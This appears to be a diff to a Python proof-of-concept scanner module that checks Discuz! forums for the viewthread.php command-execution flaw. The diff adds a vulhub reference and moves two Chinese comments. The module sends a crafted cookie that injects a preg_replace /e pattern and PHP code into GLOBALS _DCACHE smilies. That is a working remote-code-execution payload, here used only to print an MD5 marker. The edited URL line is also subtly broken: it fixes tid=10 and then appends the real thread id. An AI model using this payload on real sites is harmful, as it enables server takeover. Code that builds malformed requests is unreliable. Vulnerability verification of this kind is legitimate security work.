@@ -13,7 +13,7 @@ class Vuln(ABVuln):
     desc = '''
         Discuz! /viewthread.php 命令执行漏洞。
     '''  # 漏洞描述
-    ref = 'Unkonwn'  # 漏洞来源
+    ref = 'https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723'  # 漏洞来源
     cnvd_id = 'Unkonwn'  # cnvd漏洞编号
     cve_id = 'Unkonwn'  # cve编号
     product = 'Discuz!'  # 漏洞应用名称
@@ -43,12 +43,13 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
+            #帖子中必须有表情images/smilies,才会触发漏洞
+            #直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加cookie
             tids = gettid(self.target)
             if tids:
                 cookie = 'GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5bsearcharray%5d=/.*/eui;GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5breplacearray%5d=print_r(md5(521521))'
                 for tid in tids:
-                    #帖子中必须有表情images/smilies,才会触发漏洞
-                    payload = '/viewthread.php?tid=' + tid
+                    payload = '/viewthread.php?tid=10&extra=page%3D1' + tid
                     verify_url = self.target + payload
                     code, head, content, errcode, finalurl = hh.http(verify_url, cookie=cookie)
                     if code==200:
